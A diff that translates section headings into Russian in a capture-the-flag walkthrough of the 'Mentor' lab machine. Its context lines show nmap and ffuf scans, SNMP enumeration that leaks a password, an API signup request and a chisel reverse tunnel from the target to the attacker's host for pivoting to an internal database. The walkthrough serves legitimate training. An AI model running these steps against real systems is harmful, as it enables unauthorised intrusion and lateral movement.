@@ -57,7 +57,7 @@ Mentor - это машина средней сложности на Linux, вк�
 
 ## Разведка
 
-### Port Scan
+### Сканирование Портов
 
 ```bash
 nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.115.144
@@ -72,7 +72,7 @@ nmap -p- --min-rate 5000 -T4 -Pn -n 10.129.115.144
 echo "10.129.115.144 mentorquotes.htb api.mentorquotes.htb" | sudo tee -a /etc/hosts
 ```
 
-### vHost Enumeration
+### Перечисление vHost
 
 ```bash
 ffuf -u http://10.129.115.144 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200,404 -fs 0
@@ -86,7 +86,7 @@ ffuf -u http://10.129.115.144 -H "Host: FUZZ.mentorquotes.htb" -w /usr/share/sec
 
 No CVE (custom vulnerability) - строка сообщества SNMP раскрывает учётные данные API, и API принимает неочищенный ввод, который доходит до шелла (слепой RCE).
 
-### SNMP Enumeration
+### Перечисление SNMP
 
 ```bash
 sudo nmap -sU -F -Pn -n 10.129.115.144
@@ -114,7 +114,7 @@ snmpwalk -v2c -c internal 10.129.115.144 .1.3.6.1.2.1.25.4.2.1.5 | grep login.py
 iso.3.6.1.2.1.25.4.2.1.5.2078 = STRING: "/usr/local/bin/login.py <PASSWORD>"
 ```
 
-### API Signup / Login
+### API Регистрация / Вход
 
 ```bash
 curl -s -X POST http://api.mentorquotes.htb/auth/signup -H 'Content-Type: application/json' -d '{"email": "n3xu6@mentor.htb", "username": "n3xu6", "password": "password123"}'
@@ -246,7 +246,7 @@ chmod +x /tmp/chisel
 /tmp/chisel client 10.10.15.20:8001 R:127.0.0.1:8002:172.22.0.4:5432
 ```
 
-### PostgreSQL Access
+### Доступ к PostgreSQL
 
 Подключение к базе данных с использованием учетных данных по умолчанию:
 
